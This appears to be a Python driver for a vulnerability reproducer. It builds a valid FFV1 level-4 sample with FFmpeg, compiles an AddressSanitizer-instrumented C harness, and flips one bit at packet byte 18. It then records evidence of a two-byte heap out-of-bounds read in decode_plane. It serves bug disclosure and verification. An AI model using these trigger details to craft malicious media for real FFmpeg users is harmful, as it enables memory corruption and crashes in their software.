"""Build and record the FFV1 remap-table out-of-bounds-read reproducer."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import platform
import subprocess
from datetime import datetime, timezone
from pathlib import Path

SCHEMA_VERSION = "cw.ffmpeg.ffv1-remap-reproducer.v1"


def _arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--checkout", type=Path, required=True)
    parser.add_argument(
        "--harness",
        type=Path,
        default=Path(__file__).with_name("ffmpeg_ffv1_remap_reproducer.c"),
    )
    parser.add_argument("--sample-output", type=Path, required=True)
    parser.add_argument("--binary-output", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    return parser.parse_args()


def _sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for block in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def _compile_command(harness: Path, binary: Path) -> list[str]:
    command = [
        "clang",
        "-I.",
        "-D_ISOC11_SOURCE",
        "-D_FILE_OFFSET_BITS=64",
        "-D_LARGEFILE_SOURCE",
        "-I./compat/dispatch_semaphore",
        "-DPIC",
        "-I./compat/stdbit",
        "-DZLIB_CONST",
        "-DHAVE_AV_CONFIG_H",
        "-fsanitize=address,undefined",
        "-fno-omit-frame-pointer",
        "-g",
        "-O1",
        "-std=c17",
        "-fPIC",
        "-pthread",
        "-o",
        str(binary),
        str(harness),
        "-Llibavformat",
        "-Llibavcodec",
        "-Llibswresample",
        "-Llibavutil",
        "-lavformat",
        "-lavcodec",
        "-lswresample",
        "-lavutil",
        "-lm",
        "-lbz2",
        "-lz",
    ]
    if platform.system() == "Darwin":
        command.extend(
            [
                "-framework",
                "CoreFoundation",
                "-framework",
                "Security",
                "-liconv",
                "-framework",
                "AudioToolbox",
                "-framework",
                "VideoToolbox",
                "-framework",
                "CoreMedia",
                "-framework",
                "CoreVideo",
                "-framework",
                "CoreServices",
            ]
        )
    command.append("-pthread")
    return command


def main() -> None:
    args = _arguments()
    checkout = args.checkout.expanduser().resolve()
    harness = args.harness.expanduser().resolve()
    sample = args.sample_output.expanduser().resolve()
    binary = args.binary_output.expanduser().resolve()
    output = args.output.expanduser().resolve()
    ffmpeg = checkout / "ffmpeg"
    if not harness.is_file() or not ffmpeg.is_file():
        raise ValueError("harness and sanitizer-instrumented FFmpeg must exist")

    sample.parent.mkdir(parents=True, exist_ok=True)
    binary.parent.mkdir(parents=True, exist_ok=True)
    output.parent.mkdir(parents=True, exist_ok=True)
    sample_command = [
        str(ffmpeg),
        "-hide_banner",
        "-loglevel",
        "error",
        "-f",
        "lavfi",
        "-i",
        "nullsrc=s=513x1,format=yuv444p16le,geq=lum='X':cb=0:cr=0",
        "-frames:v",
        "1",
        "-c:v",
        "ffv1",
        "-level",
        "4",
        "-strict",
        "experimental",
        "-remap_mode",
        "1",
        "-slicecrc",
        "0",
        "-coder",
        "1",
        "-f",
        "nut",
        "-y",
        str(sample),
    ]
    sample_result = subprocess.run(
        sample_command, check=False, capture_output=True, text=True
    )
    baseline_command = [
        str(ffmpeg),
        "-hide_banner",
        "-loglevel",
        "error",
        "-i",
        str(sample),
        "-frames:v",
        "1",
        "-f",
        "null",
        "-",
    ]
    baseline_result = subprocess.run(
        baseline_command, check=False, capture_output=True, text=True
    )
    compile_command = _compile_command(harness, binary)
    compile_result = subprocess.run(
        compile_command, cwd=checkout, check=False, capture_output=True, text=True
    )
    environment: dict[str, str] | None = None
    if sample_result.returncode == 0 and compile_result.returncode == 0:
        environment = os.environ.copy()
        environment["ASAN_OPTIONS"] = (
            "halt_on_error=1:abort_on_error=1:detect_leaks=0"
        )
        run_command = [str(binary), str(sample), "18", "0"]
        run_result = subprocess.run(
            run_command,
            cwd=checkout,
            env=environment,
            check=False,
            capture_output=True,
            text=True,
        )
    else:
        run_command = [str(binary), str(sample), "18", "0"]
        run_result = subprocess.CompletedProcess(
            run_command, 127, "", "setup failed"
        )

    combined = run_result.stdout + run_result.stderr
    indicators = {
        "valid_sample_generated": sample_result.returncode == 0,
        "valid_sample_decodes": baseline_result.returncode == 0,
        "single_bit_mutation_applied": (
            "mutation_byte=18 mutation_bit=0" in combined
        ),
        "asan_heap_buffer_overflow": (
            "AddressSanitizer: heap-buffer-overflow" in combined
        ),
        "two_byte_out_of_bounds_read": "READ of size 2" in combined,
        "decode_plane_sink": "in decode_plane" in combined,
    }
    expected_observed = compile_result.returncode == 0 and all(indicators.values())
    commit_result = subprocess.run(
        ["git", "rev-parse", "HEAD"],
        cwd=checkout,
        check=False,
        capture_output=True,
        text=True,
    )
    payload = {
        "schema_version": SCHEMA_VERSION,
        "completed_at": datetime.now(timezone.utc).isoformat(),
        "checkout": str(checkout),
        "checkout_commit": commit_result.stdout.strip() or None,
        "ffmpeg_sha256": _sha256(ffmpeg),
        "harness": str(harness),
        "harness_sha256": _sha256(harness),
        "sample": str(sample),
        "sample_sha256": _sha256(sample) if sample.is_file() else None,
        "binary": str(binary),
        "binary_sha256": _sha256(binary) if binary.is_file() else None,
        "sample_command": sample_command,
        "sample_returncode": sample_result.returncode,
        "sample_stdout": sample_result.stdout,
        "sample_stderr": sample_result.stderr,
        "baseline_command": baseline_command,
        "baseline_returncode": baseline_result.returncode,
        "baseline_stdout": baseline_result.stdout,
        "baseline_stderr": baseline_result.stderr,
        "compile_command": compile_command,
        "compile_returncode": compile_result.returncode,
        "compile_stdout": compile_result.stdout,
        "compile_stderr": compile_result.stderr,
        "run_command": run_command,
        "asan_options": environment["ASAN_OPTIONS"] if environment else None,
        "returncode": run_result.returncode,
        "indicators": indicators,
        "expected_observed": expected_observed,
        "scope": (
            "A valid 513x1 yuv444p16le FFV1 level-4 remap packet has a "
            "non-power-of-two table count. Flipping bit zero of packet byte "
            "18 changes attacker-controlled entropy data while preserving the "
            "remap table. decode_line produces an unused masked symbol and "
            "decode_plane reads outside the pixel_num-sized fltmap allocation."
        ),
        "stdout": run_result.stdout,
        "stderr": run_result.stderr,
    }
    temporary = output.with_suffix(output.suffix + ".tmp")
    temporary.write_text(
        json.dumps(payload, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    temporary.replace(output)
    print(output)
    if not expected_observed:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
